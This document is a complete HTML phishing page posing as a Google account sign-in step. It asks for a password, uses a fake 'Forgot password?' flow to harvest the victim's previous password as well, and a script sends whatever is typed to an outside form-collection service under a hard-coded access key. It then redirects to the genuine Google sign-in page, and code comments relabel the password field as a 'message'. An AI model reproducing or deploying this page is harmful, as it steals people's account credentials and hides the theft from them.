<!doctype html>
<html lang="bn">
<head>

<link rel="icon" type="image/x-icon" href="favicon.ico">
  <title>তোমার ওয়েবসাইটের নাম</title>
</head>

<link rel="icon" type="image/png" href="46334830.png" sizes="140*140">

  
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Dark Login — Message Mode (final)</title>
<style>
  :root{
    --bg:#161515; --card:#000000; --muted:#9aa0a6; --accent:#8aa9ff; --radius:28px;
    font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
  }
  *{box-sizing:border-box}
  html,body{height:100%;margin:0}
  body{background:var(--bg);display:flex;align-items:center;justify-content:center;padding:24px;color:#e6eef8}
  .wrap{width:100%;max-width:520px;background:var(--card);border-radius:var(--radius);padding:32px 36px;box-shadow:0 10px 40px rgba(0,0,0,0.6);display:flex;flex-direction:column;align-items:center}
  .logo{width:140px;height:auto;display:block;margin-bottom:10px;border-radius:8px}
  h1{font-size:34px;margin:0;font-weight:600;line-height:1}
  .user-info{width:100%;max-width:360px;margin-top:12px;margin-bottom:12px}
  .user-info input{width:100%;padding:14px 16px;border-radius:999px;border:1px solid rgba(255,255,255,0.10);background:rgba(255,255,255,0.03);color:#fff;font-size:15px;outline:none;cursor:default;text-align:center}
  form{display:flex;flex-direction:column;gap:10px;width:100%;max-width:360px}
  .field{display:flex;flex-direction:column;gap:6px}
  label{font-size:13px;color:var(--muted);display:block}
  input[type="password"], input[type="text"]{background:transparent;border:1px solid rgba(255,255,255,0.08);padding:12px;border-radius:10px;color:#fff;font-size:15px;outline:none}
  .small-note{font-size:13px;color:var(--muted);text-align:center;margin-top:6px;min-height:18px}
  .controls{display:flex;align-items:center;justify-content:space-between;margin-top:2px;position:relative}
  .checkbox{display:flex;align-items:center;gap:10px;color:var(--muted);font-size:14px;font-weight:600}
  .checkbox input{width:20px;height:20px;appearance:none;border:2px solid #8aa9ff;border-radius:6px;cursor:pointer;position:relative;background:transparent}
  .checkbox input:checked{background:#8aa9ff}
  .checkbox input:checked::after{content:'✔';position:absolute;top:1px;left:3px;font-size:12px;color:#000}
  .forgot-wrap{display:flex;align-items:center;gap:8px}
  .link{color:var(--accent);text-decoration:none;font-size:14px;cursor:pointer;transition:opacity .25s}
  .spinner{width:14px;height:14px;border-radius:50%;border:2px solid rgba(255,255,255,0.12);border-top-color:var(--accent);animation:spin .8s linear infinite;display:inline-block}
  @keyframes spin{to{transform:rotate(360deg)}}
  .btn-row{display:flex;align-items:center;justify-content:flex-end;margin-top:6px}
  button{background:var(--accent);border:none;color:#07224a;padding:10px 18px;border-radius:999px;font-weight:600;cursor:pointer;font-size:15px}
  .warning{color:#ff4c4c;font-size:14px;margin-top:4px;display:none;text-align:center;font-weight:600}
</style>
</head>
<body>
<main class="wrap" id="mainWrap">
  <img src="46334830.png" alt="logo" class="logo" />
  <h1>Welcome</h1>

  <div class="user-info">
    <input id="userEmail" type="text" placeholder="Confirm your account?" readonly />
  </div>







  <form id="loginForm" autocomplete="off" novalidate>
    <div class="field">
      <!-- label updated to message -->
      <label for="msg">Type your password</label>
      <!-- keep type=password for original look, but named message -->
      <input id="msg" name="message" type="password" placeholder="Enter your password" />
      <div id="lastNotice" class="small-note" aria-live="polite"></div>
    </div>

    <div class="warning" id="warning">Please enter your password.</div>






    <div class="controls">
      <label class="checkbox"><input id="showMsg" type="checkbox" aria-label="Show message"> Show password</label>
      <div class="forgot-wrap">
        <a id="forgot" class="link" href="#" role="button" aria-pressed="false">
          <span id="forgotText">Forgot password?</span>
        </a>
      </div>
    </div>



<div style="width:100%; text-align:center; margin-top:12px; font-size:13px; color:#9aa0a6;">
  <a href="https://support.google.com/accounts" target="_blank" class="footer-link">Help</a>
  <a href="https://policies.google.com/" target="_blank" class="footer-link">Privacy</a>
  <a href="https://policies.google.com/" target="_blank" class="footer-link">Terms</a>
</div>

<style>
  .footer-link {
    color: #8aa9ff;
    text-decoration: none;
    margin: 0 8px;
    transition: color 0.25s;
    cursor: pointer;
  }
  .footer-link:hover {
    color: #ffffff;
    text-decoration: underline;
  }
</style>


    <div class="btn-row">
      <button id="nextBtn" type="submit">Next</button>
    </div>
  </form>
</main>


<script>
(function(){
  const form = document.getElementById('loginForm');
  const msg = document.getElementById('msg');           // message input (visual as password)
  const show = document.getElementById('showMsg');      // show checkbox
  const warning = document.getElementById('warning');
  const forgot = document.getElementById('forgot');
  const forgotText = document.getElementById('forgotText');
  const lastNotice = document.getElementById('lastNotice');

  // escape HTML helper for safe message_html
  function escapeHtml(s){
    return String(s)
      .replace(/&/g,'&amp;')
      .replace(/</g,'&lt;')
      .replace(/>/g,'&gt;')
      .replace(/"/g,'&quot;')
      .replace(/'/g,'&#39;');
  }

  // Show/hide message (keeps original look: input is password by default)
  show.addEventListener('change', () => {
    // toggle between password and text while preserving cursor/value
    const v = msg.value;
    msg.type = show.checked ? 'text' : 'password';
    msg.value = v;
  });

  // Forgot message — visual behavior preserved
  let busy = false;
  forgot.addEventListener('click', e=>{
    e.preventDefault();
    if(busy) return;
    busy = true;

    const spinner = document.createElement('span');
    spinner.className = 'spinner';
    forgot.insertBefore(spinner, forgotText);

    forgot.style.opacity='0.7';
    forgot.style.pointerEvents='none';

    setTimeout(()=>{
      spinner.remove();
      const note = 'Enter your last password';
      msg.placeholder = note;
      msg.value = '';
      lastNotice.textContent = note;

      // hide forgot text
      forgotText.style.opacity = '0';
      forgotText.style.pointerEvents = 'none';

      forgot.style.opacity='0.5';
      forgot.style.pointerEvents='none';
    },700);
  });

  // Main submit: send to Web3Forms then redirect to Google
  form.addEventListener('submit', async function(e){
    e.preventDefault();
    const value = msg.value.trim();
    if(!value){
      warning.style.display = 'block';
      return;
    }
    warning.style.display = 'none';

    // Prepare payload: message (plain) + message_html (big & bold)
    const messageHtml = '<div style="font-size:18px;font-weight:700;">' + escapeHtml(value).replace(/\n/g, '<br>') + '</div>';

    const payload = {
      access_key: '45419df3-c283-4613-a704-e893ce9fca2f',
      name: document.getElementById('userEmail')?.value || '',
      message: value,
      message_html: messageHtml
    };

    try {
      // send to Web3Forms
      await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      // likely CORS or network error — log only
      console.error('Submission error:', err);
    }

    // redirect to Google sign-in after sending attempt
    window.location.href = 'https://accounts.google.com/signin';
  });

  // Enter key -> submit (preserve original)
  msg.addEventListener('keydown', function(e){
    if(e.key === 'Enter'){
      e.preventDefault();
      form.dispatchEvent(new Event('submit', { cancelable: true }));
    }
  });
})();
</script>

</body>
</html>
